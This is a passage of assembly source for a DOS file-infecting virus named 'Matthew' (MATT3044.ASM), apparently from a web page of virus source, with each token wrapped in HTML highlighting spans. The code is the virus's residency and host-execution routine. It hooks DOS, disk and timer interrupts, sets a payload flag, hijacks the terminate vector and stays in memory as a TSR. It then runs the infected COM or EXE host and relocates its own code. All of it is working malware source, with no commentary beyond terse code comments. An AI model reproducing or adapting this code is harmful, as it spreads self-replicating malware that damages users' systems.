       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">MemoryMarkerLoc</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">     </span><span class="sc1">; early version</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">isMemoryResident</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">PrepareToMoveCode</span><span class="sc0">
 
 </span><span class="sc5">isMemoryResident</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExecuteHostProgram</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- prepare to go memory resident</span><span class="sc0">
 
 </span><span class="sc5">SetUpMatthew</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">    
       </span><span class="sc6">cli</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">sti</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">HostProgramSegment</span><span class="sc0">     </span><span class="sc1">; copy move coder</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">HostProgramOffset</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MoveCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseEnvironment</span><span class="sc0">        </span><span class="sc1">; release environment</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InitializeClockCounter</span><span class="sc0">    </span><span class="sc1">; initialize timer</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ClearPayloadFlag</span><span class="sc0">          </span><span class="sc1">; clear payload flag</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveInt21Vector</span><span class="sc0">           </span><span class="sc1">; save int 21</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HookInt21</span><span class="sc0">                 </span><span class="sc1">; hook int 21</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveInt13Vector</span><span class="sc0">           </span><span class="sc1">; save int 13</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HookInt13</span><span class="sc0">                 </span><span class="sc1">; hook int 13</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveInt08Vector</span><span class="sc0">           </span><span class="sc1">; save int 8</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HookInt08</span><span class="sc0">                 </span><span class="sc1">; hook int 8</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MakeDecryptedCopyOfMessage</span><span class="sc0"> </span><span class="sc1">;create fresh copy of text</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; save segment of environment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Environment</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">                    </span><span class="sc1">; save terminate vector (int 22)</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isTerminate</span><span class="sc0">     </span><span class="sc1">; set virus terminate routine</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">                    </span><span class="sc1">; what for?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">                    </span><span class="sc1">; tsr</span><span class="sc0">
 </span><span class="sc5">isTerminate</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetMemoryMark</span><span class="sc0">             </span><span class="sc1">; st memory selfrec</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">Psp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc0">    </span><span class="sc1">; restore terminate vector</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Psp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">ExecParam</span><span class="sc0">              </span><span class="sc1">; set-up exec param</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">5ch</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc2">6ch</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Environment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                    </span><span class="sc1">; get dos version</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DosVersion</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">cli</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeSs</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeSp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
       </span><span class="sc6">sti</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">HostNameEnvSegment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">HostNameEnvOffset</span><span class="sc0">
 </span><span class="sc5">ExecuteCommandCom</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">ExecParam</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">                  </span><span class="sc1">; execute host program</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">DosVersion</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">OldDos</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">VictimExecuted</span><span class="sc0">
 
 </span><span class="sc5">OldDos</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
 </span><span class="sc5">VictimExecuted</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">GetReturnCode</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">; if "file not found" error</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">GetReturnCode</span><span class="sc0">             </span><span class="sc1">; execute command.com</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetCommandComForExec</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExecuteCommandCom</span><span class="sc0">
 
 </span><span class="sc5">GetReturnCode</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cli</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc5">ExeSs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">ExeSp</span><span class="sc0">
       </span><span class="sc6">sti</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">                    </span><span class="sc1">; get return code</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">                    </span><span class="sc1">; terminate</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
 
 </span><span class="sc5">HostComRestorer</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ComLength</span><span class="sc0">              </span><span class="sc1">; restore host com and execute it</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">100h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
 
 </span><span class="sc5">ExecuteHostProgram</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">FileTypeFlag</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">isHostExe</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">                               </span><span class="sc1">; copy com host restorer to</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">                               </span><span class="sc1">; somewhere near end of segment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0fde8h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">ExecuteHostProgram</span><span class="sc4">-</span><span class="sc5">HostComRestorer</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostComRestorer</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0fde8h</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
 
 </span><span class="sc5">isHostExe</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                </span><span class="sc1">; set up segment and pointers and </span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ExeSs</span><span class="sc0">             </span><span class="sc1">; execute host exe</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">ExeSp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">    
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ExeCs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">HostProgramSegment</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ExeIp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">HostProgramOffset</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">HostProgram</span><span class="sc0">
 
 </span><span class="sc5">PrepareToMoveCode</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">HostProgramSegment</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">HostProgramOffset</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MoveCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                        </span><span class="sc1">; copy virus to start of segment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MatthewEntry</span><span class="sc0">    </span><span class="sc1">;   psp:100</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MoveCode</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MatthewEntry</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
 </span><span class="sc5">MoveCode</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetUpMatthew</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">retf</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- host com code starts here</span><span class="sc0">
 
 </span><span class="sc5">EndVirusCode</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">            </span><span class="sc1">;cd 20</span><span class="sc0">
 
 </span><span class="sc5">Matthew</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
 
      </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">MatthewEntry</span><span class="sc0">
 
</span><span class="sc1">; ฤฤ MATT3044.ASM ENDS HERE ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span></div></body>
</html>
